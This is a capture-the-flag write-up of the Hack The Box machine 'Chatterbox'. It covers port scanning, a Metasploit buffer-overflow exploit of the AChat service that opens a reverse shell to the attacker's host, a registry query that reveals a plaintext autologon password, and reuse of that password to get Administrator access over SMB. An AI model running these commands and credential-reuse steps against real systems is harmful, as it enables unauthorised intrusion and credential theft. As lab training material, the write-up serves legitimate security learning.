---
machine: Chatterbox
platform: Hack The Box
category: Windows
difficulty: Medium
points: 30
tags: [achat, buffer-overflow, seimpersonate, registry-creds]
date: 2026-03-25
status: retired
summary: A Windows 7 box centered on a vulnerable third-party chat service, exercising memory-corruption exploitation against a custom network daemon and post-exploitation enumeration that surfaces stored credentials for privilege escalation and credential reuse.
---

## Enumeration

Nmap Host Scan:

```bash
┌──(kali㉿kali)-[~/htb]
└─$ nmap -p- 10.129.4.75 -T4 -oN nmaphosts
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-26 10:55 -0400
Nmap scan report for 10.129.4.75
Host is up (0.036s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9255/tcp  open  mon
9256/tcp  open  unknown
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
```

Nmap Fingerprinting Port Scan:

```bash
┌──(kali㉿kali)-[~/htb]
└─$ nmap -p 135,139,445,9255,9256 -sCV 10.129.4.75 -T4 -oN nmaphosts
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-26 10:57 -0400
Nmap scan report for 10.129.4.75
Host is up (0.037s latency).

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp open  http         AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp open  achat        AChat chat system
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-05-26T19:57:56
|_  start_date: 2026-05-26T19:53:50
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 6h20m03s, deviation: 2h18m36s, median: 5h00m01s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-26T15:57:58-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.03 seconds

```

The 9255 and 9256 ports are interesting.  Upon looking it up the service, AChat, is apparently very often vulnerable to a buffer overflow.

## Foothold

After researching this a bit more we see that there is a buffer overflow exploit on metasploit for this service, we try it and it dies.  After some research about it online I saw the suggestion to try a lighter payload like `set PAYLOAD windows/shell_reverse_tcp` instead of the traditional meterpreter shell.  I did this and it worked:

```bash
msf exploit(windows/misc/achat_bof) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
msf exploit(windows/misc/achat_bof) > run
[*] Started reverse TCP handler on 10.10.14.20:1337 
[*] Command shell session 3 opened (10.10.14.20:1337 -> 10.129.4.75:49162) at 2026-05-26 11:19:42 -0400


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

From this shell we see that we are chatterbox\alfred

We can go ahead and tree the contents of `C:\Users`

```text
tree . /F
Folder PATH listing
Volume serial number is 00000002 502F:F304
C:\USERS
����Administrator
�   ����Contacts
�   �       Administrator.contact
�   �       
�   ����Desktop
�   �       root.txt
�   �       
�   ����Documents
�   ����Downloads
�   �   �   IE11-Windows6.1-x86-en-us.exe
�   �   �   SDelete.zip
�   �   �   
�   �   ����SDelete
�   �           Eula.txt
�   �           sdelete.exe
�   �           sdelete64.exe
�   �           sdelete64a.exe
�   �           
�   ����Favorites
�   �   ����Links
�   �   �       Suggested Sites.url
�   �   �       Web Slice Gallery.url
�   �   �       
�   �   ����Links for United States
�   �   �       GobiernoUSA.gov.url
�   �   �       USA.gov.url
�   �   �       
�   �   ����Microsoft Websites
�   �   �       IE Add-on site.url
�   �   �       IE site on Microsoft.com.url
�   �   �       Microsoft At Home.url
�   �   �       Microsoft At Work.url
�   �   �       Microsoft Store.url
�   �   �       
�   �   ����MSN Websites
�   �   �       MSN Autos.url
�   �   �       MSN Entertainment.url
�   �   �       MSN Money.url
�   �   �       MSN Sports.url
�   �   �       MSN.url
�   �   �       MSNBC News.url
�   �   �       
�   �   ����Windows Live
�   �           Get Windows Live.url
�   �           Windows Live Gallery.url
�   �           Windows Live Mail.url
�   �           Windows Live Spaces.url
�   �           
�   ����Links
�   �       Desktop.lnk
�   �       Downloads.lnk
�   �       RecentPlaces.lnk
�   �       
�   ����Music
�   ����Pictures
�   ����Saved Games
�   ����Searches
�   ����Videos
����Alfred
�   ����Contacts
�   �       Alfred.contact
�   �       
�   ����Desktop
�   �       user.txt
�   �       
�   ����Documents
�   ����Downloads
�   �       MSEInstall.exe
�   �       
�   ����Favorites
�   �   ����Links
�   �   �       Suggested Sites.url
�   �   �       Web Slice Gallery.url
�   �   �       
�   �   ����Links for United States
�   �   �       GobiernoUSA.gov.url
�   �   �       USA.gov.url
�   �   �       
�   �   ����Microsoft Websites
�   �   �       IE Add-on site.url
�   �   �       IE site on Microsoft.com.url
�   �   �       Microsoft At Home.url
�   �   �       Microsoft At Work.url
�   �   �       Microsoft Store.url
�   �   �       
�   �   ����MSN Websites
�   �   �       MSN Autos.url
�   �   �       MSN Entertainment.url
�   �   �       MSN Money.url
�   �   �       MSN Sports.url
�   �   �       MSN.url
�   �   �       MSNBC News.url
�   �   �       
�   �   ����Windows Live
�   �           Get Windows Live.url
�   �           Windows Live Gallery.url
�   �           Windows Live Mail.url
�   �           Windows Live Spaces.url
�   �           
�   ����Links
�   �       Desktop.lnk
�   �       Downloads.lnk
�   �       RecentPlaces.lnk
�   �       
�   ����Music
�   ����Pictures
�   ����Saved Games
�   ����Searches
�   ����Videos
����Public
    ����Documents
    ����Downloads
    ����Music
    �   ����Sample Music
    �           Kalimba.mp3
    �           Maid with the Flaxen Hair.mp3
    �           Sleep Away.mp3
    �           
    ����Pictures
    �   ����Sample Pictures
    �           Chrysanthemum.jpg
    �           Desert.jpg
    �           Hydrangeas.jpg
    �           Jellyfish.jpg
    �           Koala.jpg
    �           Lighthouse.jpg
    �           Penguins.jpg
    �           Tulips.jpg
    �           
    ����Recorded TV
    �   ����Sample Media
    �           win7_scenic-demoshort_raw.wtv
    �           
    ����Videos
        ����Sample Videos
                Wildlife.wmv

```

I go ahead and retrieve the user flag from Alfred desktop.

## Privilege Escalation

I checked `net user Alfred` and `whoami /priv` and don't see anything too interesting about our alfred account

To escalate I attempted several different methods of uploading a file to the server to run an automated privesc script like `privescCheck.ps1` but none seemed to work as entering powershell breaks the shell and forces me to restart the box and certutil is access denied.

While going through my manual enumeration/escalation checklist I found this in Winlogon:

```text
C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
```

This gives us cred pair `Alfred:Welcome1!`

This gives us access to list the shares in smb but not interact with them

```bash
┌──(kali㉿kali)-[~/htb/chatter]
└─$ nxc smb 10.129.4.81 -u 'Alfred' -p 'Welcome1!' --shares
SMB         10.129.4.81     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 x32 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.129.4.81     445    CHATTERBOX       [+] Chatterbox\Alfred:Welcome1! 
SMB         10.129.4.81     445    CHATTERBOX       [*] Enumerated shares
SMB         10.129.4.81     445    CHATTERBOX       Share           Permissions     Remark
SMB         10.129.4.81     445    CHATTERBOX       -----           -----------     ------
SMB         10.129.4.81     445    CHATTERBOX       ADMIN$                          Remote Admin
SMB         10.129.4.81     445    CHATTERBOX       C$                              Default share
SMB         10.129.4.81     445    CHATTERBOX       IPC$                            Remote IPC

```

If we go ahead and check for credential reuse against all users (or just Administrator in our case), we find that this password is also the same for Administrator:

```bash
┌──(kali㉿kali)-[~/htb/chatter]
└─$ nxc smb 10.129.4.81 -u 'Administrator' -p 'Welcome1!' --shares
SMB         10.129.4.81     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 x32 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.129.4.81     445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)
SMB         10.129.4.81     445    CHATTERBOX       [*] Enumerated shares
SMB         10.129.4.81     445    CHATTERBOX       Share           Permissions     Remark
SMB         10.129.4.81     445    CHATTERBOX       -----           -----------     ------
SMB         10.129.4.81     445    CHATTERBOX       ADMIN$          READ,WRITE      Remote Admin
SMB         10.129.4.81     445    CHATTERBOX       C$              READ,WRITE      Default share
SMB         10.129.4.81     445    CHATTERBOX       IPC$                            Remote IPC
```

From here we can navigate the C$ share and get the root.txt file from the Administrator's Desktop with `impacket-smbclient Administrator:'Welcome1!'@<ip>`

Simply `get` it and `cat` it locally and box is solved!
